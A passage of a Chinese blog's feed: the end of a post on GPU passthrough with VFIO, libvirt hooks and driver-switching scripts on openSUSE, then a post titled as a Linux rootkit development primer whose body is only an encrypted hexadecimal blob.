MSR（防止崩溃），创建 <code>/etc/modprobe.d/kvm.conf</code> 文件并写入：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">options</span> kvm ignore_msrs=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>重启电脑后你就会发现 N 卡驱动载入失败，因为此时 VFIO 先一步取得了N 卡的所有权：）</p><p><img src="https://s2.loli.net/2024/02/25/xZzI4O9J5niXDqf.png"></p><p>如果你想再用上 N 卡闭源驱动搞事情，可以通过如下脚本装载回 N 卡驱动，这里我们用 <code>virsh</code> 来重新装载设备，注意查看 N 卡对应的 pci 号设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r vfio-pci<br>virsh nodedev-reattach pci_0000_01_00_0<br>sudo modprobe nvidia<br>sudo modprobe nvidia_modeset<br>sudo modprobe nvidia_uvm<br>sudo modprobe nvidia_drm<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/sfDjCAB149aK5Ye.png"></p><p>重新用回 VFIO 的话就是反着来的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>sudo modprobe -r nvidia_drm<br>sudo modprobe -r nvidia_uvm<br>sudo modprobe -r nvidia_modeset<br>sudo modprobe -r nvidia<br>virsh nodedev-detach pci_0000_01_00_0<br>sudo modprobe vfio-pci<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/PDVGtKZJ3TSujkF.png"></p><h3 id="配置显卡直通"><a href="#配置显卡直通" class="headerlink" title="配置显卡直通"></a>配置显卡直通</h3><p>接下来我们将这张卡通进 VM 中，首先用如下脚本查看显卡所在 IOMMU 组都有哪些设备：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">shopt</span> -s nullglob<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> /sys/kernel/iommu_groups/*/devices/*; <span class="hljs-keyword">do</span> <br>    n=<span class="hljs-variable">$&#123;d#*/iommu_groups/*&#125;</span>; n=<span class="hljs-variable">$&#123;n%%/*&#125;</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;IOMMU Group %s &#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$n</span>&quot;</span><br>    lspci -nns <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;d##*/&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/02/25/uWZP85BcjrdQs7x.png" alt="比较幸运的是笔者的 N 卡所在组只有一个设备"></p><p>接下来在 virt-manager 中添加 <code>PCI Host Device</code> 选<strong>显卡所在的整个 IOMMU group 设备</strong>即可：</p><p><img src="https://s2.loli.net/2024/02/25/AKMU9xRwONFc4jC.png" alt="小学生都会做"></p><blockquote><p>启动前注意把 Video 换成 <code>virtio</code> 而非 <code>QXL</code> ，否则在 SPICE 服务启动后鼠标没法正常工作：(</p></blockquote><p>之后就完成直通了：</p><p><img src="https://s2.loli.net/2024/02/26/9Ycy386z1DJwiWB.png"></p><p><img src="https://s2.loli.net/2024/02/25/LVaHAEvjuQZhdqy.png"></p><p>如果你和笔者一样电脑自带的视频输出口都走独显，则可以通过外接显示器直接输出虚拟机内容，这样就不需要忍受 virtio&#x2F;qxl 那极其底下的性能了：</p><p><img src="https://s2.loli.net/2024/02/28/5mcCALesxZbzUfq.jpg"></p><h3 id="配置-libvirt-hook-动态装载显卡"><a href="#配置-libvirt-hook-动态装载显卡" class="headerlink" title="配置 libvirt hook 动态装载显卡"></a>配置 libvirt hook 动态装载显卡</h3><p>我们只需要将前面的两个脚本写到  <code>/etc/libvirt/hooks/qemu</code> 脚本中即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>VM_NAME=<span class="hljs-string">&quot;Windows11PhysVM&quot;</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$1</span> == <span class="hljs-variable">$VM_NAME</span> ]] &amp;&amp; [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> || <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;stopped&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>   <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$2</span> == <span class="hljs-string">&quot;prepare&quot;</span> ]] ; <span class="hljs-keyword">then</span><br>     sudo modprobe -r nvidia_drm<br>     sudo modprobe -r nvidia_uvm<br>     sudo modprobe -r nvidia_modeset<br>     sudo modprobe -r nvidia<br>     virsh nodedev-detach pci_0000_01_00_0<br>     sudo modprobe vfio-pci<br>   <span class="hljs-keyword">else</span><br>     sudo modprobe -r vfio-pci<br>     virsh nodedev-reattach pci_0000_01_00_0<br>     sudo modprobe nvidia<br>     sudo modprobe nvidia_modeset<br>     sudo modprobe nvidia_uvm<br>     sudo modprobe nvidia_drm<br>   <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h3 id="在虚拟机里玩原神-（To-do）"><a href="#在虚拟机里玩原神-（To-do）" class="headerlink" title="在虚拟机里玩原神 （To do）"></a><em><del>在虚拟机里玩原神</del></em> （To do）</h3><p><del>最后自然就是大家最喜欢的，原神，启动——</del> 家人们大事不妙了，👴发现原神有 VM 检测， <del>今天玩不了了，咱们下回再见吧</del></p><p><img src="https://s2.loli.net/2024/02/28/JcLyUmIOVAjeYv2.png"></p><h1 id="0x04-一些亟待解决的小问题"><a href="#0x04-一些亟待解决的小问题" class="headerlink" title="0x04. 一些亟待解决的小问题"></a>0x04. 一些亟待解决的小问题</h1><h2 id="虚拟化组件问题汇总"><a href="#虚拟化组件问题汇总" class="headerlink" title="虚拟化组件问题汇总"></a>虚拟化组件问题汇总</h2><h3 id="1-libvirtd-不会自启动"><a href="#1-libvirtd-不会自启动" class="headerlink" title="1. libvirtd 不会自启动"></a>1. libvirtd 不会自启动</h3><p>似乎是因为 libvirtd 被拆成了数个小组件，所以不管怎么 <code>enable</code> 都没法让他自启动，但是 libvirtd 不启动的话 virtiofsd 也没法正常工作，因此暂时还需要每次启动后都得手动 <code>systemctl start libvirtd.service</code></p><h2 id="xfreerdp-问题综合汇总"><a href="#xfreerdp-问题综合汇总" class="headerlink" title="xfreerdp 问题综合汇总"></a>xfreerdp 问题综合汇总</h2><h3 id="1-存在画面撕裂"><a href="#1-存在画面撕裂" class="headerlink" title="1. 存在画面撕裂"></a>1. 存在画面撕裂</h3><p>尤其是在仅转发单个应用而非整个桌面时</p><h3 id="2-新开单应用转发导致所有窗口重新开启"><a href="#2-新开单应用转发导致所有窗口重新开启" class="headerlink" title="2. 新开单应用转发导致所有窗口重新开启"></a>2. 新开单应用转发导致所有窗口重新开启</h3><p>其实桌面都在同一个 session 里，但是 xfreerdp 需要重新建一遍窗口，感觉是设计上的缺陷 ：(</p><h3 id="3-app-参数纯后台应用无法保持窗口留存"><a href="#3-app-参数纯后台应用无法保持窗口留存" class="headerlink" title="3. /app 参数纯后台应用无法保持窗口留存"></a>3. <code>/app</code> 参数纯后台应用无法保持窗口留存</h3><p>开个酷狗&#x2F;网易云之类的窗口一关 RDP 连接就也没了，感觉还是设计上的缺陷 ：(</p><h2 id="不能玩-👴-最爱的-Genshin-Impact"><a href="#不能玩-👴-最爱的-Genshin-Impact" class="headerlink" title="不能玩 👴 最爱的 Genshin Impact"></a><del>不能玩 👴 最爱的 Genshin Impact</del></h2><p>原神似乎用了比较严苛的虚拟化检查方案，所以这个后日再议了（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;4202 年了，Linux Desktop 还会好吗？&lt;/p&gt;</summary>
    
    
    
    <category term="SUSE" scheme="https://arttnba3.github.io/categories/SUSE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>【VIRUS.0x00】现代 Linux rootkit 开发导论</title>
    <link href="https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/"/>
    <id>https://arttnba3.github.io/2024/01/01/VIRUS-0X00-LINUX_ROOTKIT/</id>
    <published>2023-12-31T17:21:32.000Z</published>
    <updated>2024-02-27T06:45:58.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="没写完，别急，急的话可以先看先知上的半成品" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="29dbc155ccba645cd4d557ef7253fdc6cff3d10e9f4034b998ca60b435c37f1d">f677d6c1615e5477f274160d582541c6499bc27281a4a6519cf8aefc368b1bfd6eaec1f1c40964741832d122823bb60514e575bb9de401f52bbf7b14d4745275e747a01f6f72c040d32e2fd5b4ee724507639c5812c4b7c84482f72bcab9a8de00f3a5cefe8bd5867ff308da969ad685234484c18067cb5ed47e6bdb6296ee6b417f61264ecad82e77220b54b7f6aff461fd1e4cd5165d385c0c7665504722fc5e984e72e737f113a4cbd6c06c9d77363230d30071a9ec960cccee7923c53073944fa1dd2d2ab1d909b31168735014a10e1e7abc173a0f271ce199a56cd3b82263d79d6272650ad660676efa3fc84acbafbc341925331d258833b8933591bbaad24c56d7459dd5d28196125a24b069588f85d3d8b362857afd54c2b457a4a28dca468dcb65b9b15a2dbb5f71cc7b40b6743fbb4c6efa421f18b940c0a8f62dc564452b932abef43979e9d390c05a7848ccca0d7349b639ebd444b08819554fc7f7bcdf3b806b13d15d7ec84c3376e6ecc75837badd15f923d73f4b3d163f403500683cf7a55721f41231c969a8207fe9e2afdb8a736a26bc73b1fc69669403f3427eb19300f85f80ee4d628d361141f2e38383662c2ef905254b033f6fbc11b0ce89e80046423da409bc80b6823aee30b620833572ced4ce82be53ccc33135af423521a4699713411b743a230ce78c00440e6b896af71809d6b530dcf55277b33d31c6a494c2e050d93214db7a90e026f03d412c419a6034b795895916a98af7d6738a0c86e7eb07e47267b10bf7a179980a38b9e9031556e0d7719b75215dbba33f5708e0e49f709c4e97b32b2534dab4f4031120d37a6e7b8b27b362cde2824db65402cd3c2f2d00fd33d08be218f020566de74ed7f561b6cf4b70849d3ca3437e2a94db67a0816ed7db4018792bc8a2c3eef4c3ca59de4048c6fb7f5dd312395ca45c3cb616d180f0a39fabd3076b6f7ba300438c6243a062a47dacf293371222c6aa449ccfcc75aba601200fc8605d7521f9cd3227954ba673ab09048ca677f5d55e2caab73a808d97f921ea48cc6f2a15206204c2fa08c69d9e07724dd1f083d2da3f33d5a44af0a69543cacca41bb41e541bdd49bdd371ce54167522650e3194651d4c2a7b30a91edd193e1171d7a8e742758120004aad0b11904f3777f15b157ca1d5d018a9ac63df12ad54abe9615d43a6c49c469094dc626488cf4d02406553dfbe7f473dcc07d86907d87546b83bf177155c063962292a9629b0149b3977c488a22a829daa7b2d6baf0601fce7ad2f1ef6ae478b8e56d6baf92837e309b0a61861b3b278bd89760139a2e089410dbfe80e1a3d6ec8d8e83852f21d57ce6f2b7744bccaa2aabc4fa53181715eff6231bf6e1c219d1ceb0679c7cb580a56e4d6bf18e6b5f44e0b3989952ca5620a41f34cfe5db4390596d6b6ba1c15648bf53579cd1fe4cdc96540ce0239e27bc72ae7a94db8a9fb025e3e2bd7ba2d6676797b93f21a2376372a8f50853e645d4977eed5b139ff36aa369fdb1bffce6a8d05f4bfaa44b9c3f07bc6ea8b28dca24866fd101ca7b1898513bd9d1daa2fe08b5e98530279a342a578ad271dc5d66c5569dc5c0e0d48dc8682bf80bf9f30dbd2bcce2c345129c800cd7e2053f8947d5d1f0a3a4b2df059b85bd81d40b0c184fc38d53e9740a1d500c6a86b94fe57018fb481e8aa9a7872e9e94be55d0ca15f166e93cd2ff28082042294698ebd7bdefd41cc33a8407d51503a0f9d749a9e0a8721f822defc7f2d36bed82b2381f666a1e58a2bd12ec5b769457741741e3c44accaabed3df938b4cddbe0db18d9a5ab98a20091926f39c2666fda427aafa1a5328b031801efcf1643a3c11b483cbaf105ad92dc02bdb9be42fcff80481bc8001e6871868bf7442cbf9a62a772aec0cecfc550691fc3396ef6da2d3cc7de291976c83e8d71c43f8bb9ade363d7986fd8dab60d94f9c984a75e900dc2dbcbd61a88a5a0c5ab7d337675b5626fbb9ffb152575763761bad4a343966728465cdd744386b82fefcf54ead29aee126d49e6bf4b68740a1b1f2a217eb0fe139984abc86a5238b8b9093fd87d951de3b25adc04c7a491e78d4a922c23ac725b189d9dda13f551353c59e37aef11469098faf73dffbe382a49017d05809ff2dbb2fcf29513ad6268ee24d9212fe6e1deebb34b9f3f6ccbbb27b4b73bdbb03c85a96c9ab372ac91002fea06daa3c349c402758c980a08eae9c9e493acdb056bc2e2f384ecba6ab20f1386831995f98cdce87308d7b678eedeb1f9d3817e2228b6425426d85f65b7421e99342475c6332cff91cd4e8d36434c3b66a606da825dcde7f3175f52b76d279f455f4627f6006202a5c5d6465ec6e61a668959ffe4563ba1cb4c19540b389554ff4a0eb783a21598e599b562fabfce39ffb4ca5b05ac8603a86184362a12f86be306b2db5ecf2a7b04ff54bf76d3ec4592a60672a8aac8bae7a42011016944d8be70feb21a04be5dbf6d1b6692d75d3fa36215d57aca9e6c7415110b5ce7a26008f67374ced7f841d944948066dfc1cf1e45dc9627e53007b0e3c5c203bfda4cb7c47d39f310d82337558899f4097faf72c6bfd8ec961b2c47de46cf37bffff8a7c8f0b8a79210f562797275699664a52b7fc8ed915dc7c0a7f0fdb4a080cfe060f951fc818e46c1cc650720555f0da4e484eccd3f7296252b87973f6575f1cf26125a4662425a93f06280f961b1adac6c65a8f5c03bee6b42f43108ab8a3e257e3d7a6e724d47de4ce90d4924a7e7e8352741ac5a4ce626a497518c9ab9a0b8f8f517a1a6ebfb47d771e4135317247d424be895415adaf6fdb0c4371e1a0e17caebfac9c9c8c627a9475fc854153386f1af5a8b898da54e161ab194b12503ca6e0819af500e5d8b06e771700cd814940e9c1baa16695c672c776a09af8455f6ef388acc4121eac3990b9f0b655fa908f484c43374f6c307a421df62f62eaf1a2e67552367aca12292ed00bbd6c44d1c92dc351d2591409bd50f39c08ff11aebf6797c2af7726bec9264be2bbb7bdbc2ceae57ed2364a1bf92e6cac28cfe80b49ce16ea17d6764e5c6970f64de030785ecf89ea0578e178fbd8e5d2ca8edcc25fa49021d2052f9e012f703c462625ad3d1fd4e928992b27475077d200b504f368dd8bedd40566aa7c885ead7cc333e0ffbeac93c54d16cd63c900555b3398423ec3cc8f4ad2750728bd1bcd51e55f06142d875fb7c975f32448d8324a109d932c4dcd6a87d32a48206bb76e2449a08e00dbb9a8725d39d5d593bc353ff8f8a9b6ff153f8f3f6187b218e0b99ed1676a1b0489e98e9dc48e28d44ce6d68172a63a23ec03944946a70500972b4634ddab32ae4ed5d4d8e66ac7e98fbe4b4ed7b7014463fa052531976a683897269e86129bd136466f2feda3acc8f40febbae91383f1c7bd39b9407a23dd54de52c9390452083855b2cf8515aa5195569799a177cfad45caaabaf4bbeac178c05802b567a56c3d09a61755f7670dd2df1c1a2b3b3ea380c04d435e2f5adf8239864c216f8465e74550d3bb3ce508fe19a9176885e9235dd5f8769dcf42df91c51966fbf386881b306a6be246913433363feb8559d43195b70a4b5543ad31a2dade20b656db8270580d1391ea50a20e4232d344a622588ca7f2113d084b5d3649f47909be79611c163556a071566cb06a7ff0d581879f38bb169f20cdc3f71f3fb432363edfed9cc56806b42c5c83855eca631a72238c5c487a10bf2b10ea4119fc84ea7a9bd05c6cec870594d344a765c5486ae44ecb26a74103d0b756e5c00ea5d9998cac8d13cba3778e7070ab652a6b96b513579a22a621d2c4cfc918dcdc5e26f136cb3b3c9abe7dd13ec3f1811bb023f97e33736c92d99703cfb8c67daa7690534031b98028dc342b856536bbadd451a119f49b59c96000d04816096a9e368eea7cd838e537a21bb72eecc8ec699bd35ec6952d5efa62e1e4890c9551ef21150919e848af0ed0b275c757e9c52eabac87adcdbf10c65f61d49795a068dbfcd015428588cbe625bd8f4687797ec08bed953e53eb8ac2387e75f37dfdd803946c07bcb7f0415c726a5a9d343e2b9f70364d7bd29f5ca908d3cd7e89b42121f1e6e27d71d995cc0507c40d294ba8b457be30d9bdcbeab0b69eb6da72f6c8aebe40fec31e2bb75ef069237f3e6b8f1d3aeb6834bedb92e234bf2d2226aa99e6649458f560664350ad125183770e47195a3b9e676a765c972a767532bf4fbbf74c21bf19adf13d46d8467a5df67a09b3814d25f2fcfbcb9d3ac406776b7fec92d697a0d7a821ca85012503b720eba127f57b582c6b2559acd7f514443906e06b7deaac23becbad61cf773b9429e3d5a262ead3926c7f8d0e53fe5bab240a4c262647e43371ab519ad05ed7f1df2315b4f8030eb152ff47c4354d5982ef8b351a440f74afe5fbd7b45c1f5fb7052431c60e000d546b3e7a08a54fdec093b1ed7053d0bd75288320c28bd039fe33de90a21dc920acd62b35ffdbd0719c6525e87658620c102cb199b32f6c5ac8dbbc2960dfd3065da7e29f48f02d524bdd4c7c13dd497f0db89f5fd267cf41ac973adda98840a1f24d55a9db3e403ab6561cdf6d7eff8319e71e73ee7dbbca9e167db2bde4772c524d767cc3e6b4a007c41881cbdf4baaaca49d14c5f21eadd3b1649ef70fc9dac947c994e85ca5d499e9d1cfac75a3f900871848635ff7fadc24578857e5b6e16a7bc583293fb0b1d9d19f72ccd0a45dc0051464e17002266e8b69400914518254d1c9a89c911c2a517b791be0d49beaee84ee6ed5a9639490968d93276ad4f4f5851f68be2215a56181a6d07fa382f7a800adf463e0378508c33737818a6bced9fa9423af09dca0eeca0959e5567e1a5cac3087eff1e6850ca0a93dd1e7d0943dd2d62270124afbb33ebe496f341ff49112e5ab5b5cb57d9aa148e3d5ba4b90546a3a274f4948461edd52232d01433b87e7bee6fe55a766174ae56451583424b566a976b2ac0006401f36ea2a67d64772f9c504bf7ebacaf53629f0960f8faae0bf8ecd3f412f80eedd01467e311bec2e115b57ee78803c09809ad88cdde062e1b770fb086dd5b20037073ac1a2f75582d09c5b83b893c084fe1e08cbb37ed65c7fa56ec149f7a20910f584c8369f82d45c713d1a006fbc664317023b78e2f07c01d71620f24d7ffe456995b8b00724b65b502427c4143ab04b14655bd3cd4f9afd98b2a7558cccd508848a49f19d12ce44e7227ae49dc068d27765cc4581b77056caf982d3c1cc83eb130d280bea6bde820aa056f33dd9b24bcb4fba9e3dda1496a679532d6e755483701313334103c9753f0a64a8f4c6a751432d4c0de4462a2eabfcb8063e92bc9cbd6dab7d58ce0f23f768c191cb76d3202d7c5a93741a167043ed8c7056c0ecd5f1a34cd097be6a6d3bc92ea359c49062b1012a9de13272bc372d4c4126a831082a086818a2909c53b5bd64c53e75aefe292a04da1fb1a225afb660311282a2f81fdbef60bf5224759ce7ac4770f53e80ae26fd1d383117a27d12a4c2f4accb93d59d093d081afd569bde8b8491771ce23f15237bf45e94d790b271fb0b9688ec6b459278d0aec59cab6623170442af8e1d10a1e22b2f1c33e44f87b0c84fdd193e08475f348134c550ddda762211186ab7d39ca217485606af9455d9e31a2c4ceb84d7f69e85232493be22634a0714a390efa541bca3b750a3318d742cd91693f1ba5698794395d1eafe3c173d80a10ac9582cda8ad8206baaccf3337dce98e14e36858d17238dbcb7aca62100ecf915763feced6e1237220ff419c67633985facc52abe1be9bcae6fe7e5dd9a8b82f70a03f6450d0768bf8124e1bf278c9b17341736f255c98d06fc72e9605c4ba0cce16e2e549969c5a8c4822da72a1b90dcf65ea1acff858716f65a181f3eedab905b0a96bbea757d7837c4b3173926087418a386192023efe51cdc75a70973297373bb8f0824f816ceaf7bf1dd8a881f5516ddfb1e99c34f44d34ee5084f3dabe34415c7912310f85358b7839f0db23d3fd5ff2d2f9114122c89707254c4d5bc3fa3f0eb46d15b7e16e1e67bfb3574a69a3c538d2c4028292229525383289ca79483739697bc3f1b829062312b133f53a34ed7a46dcf686dd4086c15969d8639f7fe288e07620284937a197ddd078a3c8422389344430d69879256b062da6096f9d1cf47818e64662e5b4ce16d185a20494d9122d03f59f661601dd2d7c518b2985f794f38f8bb7d08e56c46e4a140f8229d78b07dc1af99ee5bcb87c026fa3f349f286c84bcda47e47ff0caf3ab99755578830f9261479df3a9130160df08ba8e74cef4f596bc102f481579288dd3933ae21db036dccec72c040272a8da2f2726840f057b8c9bd3dfa5386c5dd4ad39f5461a12dc63a5c6dd445bec5b319444ab3ccb87fea368d3140f1d9de598ac7b2ac8ffdd0ed771f3c0156f4c976171c71a4f781907961f1f3176377ead72bb4e7e25568759394cb76fe1d5a6d29c3af1013bdffec59d045224ef5ed4656eab36febfc57e016aa109057e4e5c38e2d178571eec53692b6d17b0150a3956c47e17b3c0b6f1c25f807d6e6c7f243c73c15fb5bd0d37fabdadb72e02938a47f0f8ed7d3a6af03f8531a326cf21f58f768a4d9705ea3240d280823bf98c800511db24131815662767ae2740ab7f94dac7ae11647d2ff67d7db588416a8d313addd66e085705bdba735a5fb793a05aea914ee71cdebb5cd18a2fe5a979393c6617108162bbb480e286502d4dc6386ad4eb3ebab7074184601b96ca4bae5d80e0e998c0af85f6b0a21537a8b4ff820f55c65affa83aacb443d39c7f4e9fcb89d3697228363926d5a6e65855258ef77918f3b8c911fec4287d2f7fbcc1b0587185f3b79c41b6e7b450bfd5e9ae8c30ddddc566f118db2b5c649af8864f485826e2b1499d29d547274262c9eb2dcee92d44f9235df0eed895a63e44cc856e5f9111daff94fe7929915697641774b34bcdcf3ad21e093b33868db8272ae36ad096d74dc318c70b1c49ac3db6f22ac711be346ff3c2520b7eeb33e075f3b9fe37d092c427246b104d45d834d0b46f1557c5b8d55d6dd35574b1f6a1fc604bf3326e8e8b885e7caeb7c3df95b258e751f6d948a7e567ad32526e65a33ef1120931b0c2fead130325ce84a5c916ccdfd6c08f99a5b17037474e48e272e88cc57c8c5ee0ced8bd8d1481deb08a9199a7bc4f4097d052cca9bdee1178f317494035672db6ef4d9875c42a2eef5046c66e7cf818829fcf8460687cdcdffc36763d0abf6feb656431d0b9d79b463a4779531cd30d344d0e73e16347c667d179f711d09f6b6dbc4909ad76f591224db1104541694477260852410d02550edddaa6a1d2ea09f4798c1f87a327351c0ff5c4fb863d6bb959e03c54cbad1b7afbe15282495269315d053472d063988b815a27abdbdccb9e9fe34181ba5765c3e6da64972092889ffbd737e5adab2a13e40e015bde5f3b287cf7bae783f0d25194838ea8c301964f20fc69c721f8b25e546c2853d5cdfbdf44c052f36aebf4d17c92c32876dd71b647b052f55f00461820f1379e0402590802d191f0d2d0d52b5dcae3fd4808900c45dd304ffed466e1a40a777beadfd8e0c1f3c693e060726da654d9be476fd15240db1b92e6c41cb934aa3f95d1e309537416e49926635d0ecf205f84dc314caf4bddfab7a95992d7da00b28d8e4f7ac0867922da073606fc58d34d0179ea7c65b45cee7e77927121c36c3c9313570d9bf301ffd424efe8122ca6ffeecbda33e243e9a91d00bf287048c163c9721c3eb12fd1da4565cce11bf64e4d850ec03a7f0b4365b90a2bcaee57a7e2522c96ef221adbc17ae7f058435dbbc7f78d06be7212033d5dbb5eff7109f90c35402c4cd880b9c39ec777e84ffe7404257df8db8fefac43468d224d9ef58eee94c505291210d8e89c6a717ad715d55dafe26b649b35fad2b40dbb04b270211f7623658809c3a4210c3d86afec7f071e40d9e4382723797216f8a28bbd7b9f43641befcb5b82f202054dbdad3860e6816340782d72d948b6cac618c03549c1ee01d3e913d0e4667821d8e224ecbac02d862c9ea509a4ac60772c02fe32557a6f53a7b81a2fc6ca113ceac94a970c9dbdb75f8cc012418a9c1acb0480040ab2ae0b8ea44529c3fb527b6fcba714bc10a422849fe788c7fcdb613b8b7a58bc67089f551b573c7af2effe5961ce344d3840aa0f09cd81c244c0e5600f1405e2c0c624d81d997fcb0a83434d2d4adc8625815c0d20393732d5074b6aa74cbcd416e9b523d378a8eba0bb4203db4979271821581e8af14f4d04f4a7e603c10fbd7cf9eaa856904abd3cd9700f0f06bc832a0da67e3a8b7e3a353c0cc9a0828f920feda4890013fae2b2399c8845133a14328c243c96b352a8b6f979e001f6399e7b0b45303691f27d9f37db9ffaade57e239ea91fa65c8ed6daefd848378ffca2832a19275a523f44ca2175fa8c4b524df868ed493afe0ec3d7f32df7449a4c19b5d158334efae6bb01e0bdd1e8a6bb2a871ad019347702a95c7a80fd64fa63db919bdfb5b412e31dd960bd89b0b3d7850b5307406922646b20650d7a0e55c0c36af781b3a0919e4647e76aeda99edb022f35c7ad83b22ce0d9cf6fe9fa54ed3713fed08eba8697bfcae9d82751d4363d5358cbc2428d8215fdec2986e0c3a78d6e73dc9605be32c8ee1ea9de1ed0fa16ae00030f8193e647cba010537c7e9079020c49edbbcfe894b07a599408c86f4527388e0c390c523a7f864644cfeeef09e29557f7aff8a1b643f1b5454250dac62f04041ff50e60bfff6aaeae68cf8766d5d4b6d1aa35fc7c0d3935e0b5eefa87dda46d2a179e7f8ea7b5863ca194b5c6935859e2ed4dedac532c8701bd6f87f6614f84fd07439bec27feeafc0bc018fabbf006daf7a92486121b0654ad97d6cdddc07d4aaad39af5885e0d94a86672461dfb666e07e64e15921e1602c613ccbe04ba514f4544a91ddf82b9b662caae72c0cca8c002a335495f56dcc1f818018bd15c202c67399edd2ab38ea3e129b5a9ab8e4560a61a9eefa2fe6dda590beb379f690e7a44d88774e80b7c4000063586df2f62b7105288af9420fa16fabc11acb8a975dadd7034a5f03617bb52d18a583dd347d0c18971202dbb83e200895d3e236d21b6684d2a4f32fb1b267732161639921295072a3f4f14853a48431dfe69905ee718a7b37d478e505d971be199dc1912cc6fdcc41402be2fc894175f5a73f47a2a1e1687d8ee0401fe67ca30a2e38f38721f7ee979d6664895fcff0b63325875a3531b03cf589596977ea9fce2805e3ce3b151aff5d324da74c3cfc153dd52fa07e39271451aabe442e31780534eeedad0473dbbc47d1b915ca8aa3ea3752cd8b6ee762303b323484a9cfbd45a0928362f8afa632fbd99475c5ba90871fd667305702711094939f000554fcd028ce9a1a89e4cb1e1e9dbd1201027f06ea4147be408fa1bb3102008ca8dc8d5b51d5da8622c5e006fcb7203ecefb53a4ed01b83e3be5324c3e45f6d15b531f3a9e2b4ca068334045d0617eaa793aec8c61bb8dcaa8ab3bcfb2075b808f61520e2f4f3778fdd53090d5d4ea398c131c3227fbcdd027a21e67c89b02c3696a86b1dd9b099dd18ba37fdaa421e4c9db58299cd183d00147d5f82097857e0dcf70b3941db3cdb87241165b86446ccd0b205bbdf69e6139011aac0209fb165c708e2a28aaa5aefe99b36f67c68d30b051239a64a31c71b77b05e441ec339aa89dcfccb02233f8185f8459456eb847f59a909ef2fe8bf1403c007fb6f29c7dcc8c9de1ea9dd7aba740d0d4ecc7e083b42410659ff2173b572b3dc99c3ff6ef443b8924a65b66fc307c40a84f5ee15a1f36c2219bfec4d5ebc6ac4ae48f60c8e2b3832254bc7c088f7d5db94c833f51920a1f910ccb1fc14806ad65d205999ba9c31dd9117c12dd4358ac1ffff00e64c6929fc3525679ec151c42043ad7ce3b64049859886bbbf32b506693465f5556d88dc7519057cd6eff1075ce40ef9dd6b7d9a274729455db95fc7f182e0f2a69da62d1fdb8d69f7cdfb6407bfd5206113e3190981328f64650283e7577758a8f245a17741f28514ca834528d5b1fd87bdd4399ec346243ee2ae7fc9410ee10e4b0ee814f7912d0e51412efcd9b17153b39043904eff48c66237a06aef7c66dfb241715d74df40c05a6fcddf389582fadb07dde5d9d642a0ddbff6d61a125c2e35a93cde09cc6ad6053f7c29dfc8c16ef6cdec8fc4f58f9a2398e1db6efc9e2fbea4dbf9bce707c7aa8738c78fe6d3635079056e62d0acc8ab9b5c6d0f9d197e409de1a4871cb583103e866d7f782cf04f9723063b75d0b91d46688b34fd4878f4960f6d5ee687e3cc960a4a2f5a510e1336b405a966246b70ec84b80b120d51368f0d1fb38b0da10a919cfe92ddead6a3b96a26a7af895d689d81611095110d6b752232366ef4869e5b34d2cc999e98cd17c1e506c89f74acaab9835085be850d4bee7dd2ca7fb0c36f1f821cb0bc248d97db83e52853bce9b743a8d1bbe7c17a329c5bb7e153052efe9ca3096d486f0677bd0538c8186697c6fd1337c884cfc0ef44221f121541cf367a0b5e7ed8fd64dc69ac6dd937f3b956d96019c5feae4d14f908c7946b6f77441860788e9cd278d9d1fc4f59bc95383c